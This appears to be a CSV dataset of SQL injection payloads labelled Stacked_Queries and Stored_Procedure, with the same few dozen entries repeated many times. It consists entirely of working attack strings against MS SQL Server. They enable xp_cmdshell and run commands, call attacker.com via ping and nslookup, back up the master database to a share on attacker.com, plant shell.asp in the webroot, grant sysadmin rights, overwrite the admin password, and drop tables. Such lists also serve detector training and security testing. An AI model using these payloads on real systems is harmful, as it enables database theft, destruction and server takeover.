Payload,Tipo
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; EXEC xp_cmdshell('whoami')--,Stored_Procedure
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",Stored_Procedure
'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,Stored_Procedure
"'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",Stored_Procedure
"'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",Stored_Procedure
'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,Stored_Procedure
'; EXEC sp_who--,Stored_Procedure
'; EXEC sp_helpdb--,Stored_Procedure
'; EXEC sp_configure--,Stored_Procedure
"'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",Stored_Procedure
'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,Stored_Procedure
"'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",Stored_Procedure
"'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",Stored_Procedure
'; EXEC sp_MSgetversion--,Stored_Procedure
'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,Stored_Procedure
'; EXEC xp_cmdshell('whoami')--,Stored_Procedure
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",Stored_Procedure
'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,Stored_Procedure
"'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",Stored_Procedure
"'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",Stored_Procedure
'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,Stored_Procedure
'; EXEC sp_who--,Stored_Procedure
'; EXEC sp_helpdb--,Stored_Procedure
'; EXEC sp_configure--,Stored_Procedure
"'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",Stored_Procedure
'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,Stored_Procedure
"'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",Stored_Procedure
"'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",Stored_Procedure
'; EXEC sp_MSgetversion--,Stored_Procedure
'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,Stored_Procedure
'; EXEC xp_cmdshell('whoami')--,Stored_Procedure
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",Stored_Procedure
'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,Stored_Procedure
"'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",Stored_Procedure
"'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",Stored_Procedure
'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,Stored_Procedure
'; EXEC sp_who--,Stored_Procedure
'; EXEC sp_helpdb--,Stored_Procedure
'; EXEC sp_configure--,Stored_Procedure
"'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",Stored_Procedure
'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,Stored_Procedure
"'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",Stored_Procedure
"'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",Stored_Procedure
'; EXEC sp_MSgetversion--,Stored_Procedure
'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,Stored_Procedure
'; EXEC xp_cmdshell('whoami')--,Stored_Procedure
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",Stored_Procedure
'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,Stored_Procedure
"'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",Stored_Procedure
"'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",Stored_Procedure
'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,Stored_Procedure
'; EXEC sp_who--,Stored_Procedure
'; EXEC sp_helpdb--,Stored_Procedure
'; EXEC sp_configure--,Stored_Procedure
"'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",Stored_Procedure
'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,Stored_Procedure
"'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",Stored_Procedure
"'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",Stored_Procedure
'; EXEC sp_MSgetversion--,Stored_Procedure
'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,Stored_Procedure
'; EXEC xp_cmdshell('whoami')--,Stored_Procedure
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",Stored_Procedure
'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,Stored_Procedure
"'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",Stored_Procedure
"'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",Stored_Procedure
'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,Stored_Procedure
'; EXEC sp_who--,Stored_Procedure
'; EXEC sp_helpdb--,Stored_Procedure
'; EXEC sp_configure--,Stored_Procedure
"'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",Stored_Procedure
'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,Stored_Procedure
"'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",Stored_Procedure
"'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",Stored_Procedure
'; EXEC sp_MSgetversion--,Stored_Procedure
'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,Stored_Procedure
'; EXEC xp_cmdshell('whoami')--,Stored_Procedure
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",Stored_Procedure
'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,Stored_Procedure
"'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",Stored_Procedure
"'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",Stored_Procedure
'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,Stored_Procedure
'; EXEC sp_who--,Stored_Procedure
'; EXEC sp_helpdb--,Stored_Procedure
'; EXEC sp_configure--,Stored_Procedure
"'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",Stored_Procedure
'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,Stored_Procedure
"'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",Stored_Procedure
"'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",Stored_Procedure
'; EXEC sp_MSgetversion--,Stored_Procedure
'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,Stored_Procedure
'; EXEC xp_cmdshell('whoami')--,Stored_Procedure
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",Stored_Procedure
'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,Stored_Procedure
"'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",Stored_Procedure
"'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",Stored_Procedure
'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,Stored_Procedure
'; EXEC sp_who--,Stored_Procedure
'; EXEC sp_helpdb--,Stored_Procedure
'; EXEC sp_configure--,Stored_Procedure
"'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",Stored_Procedure
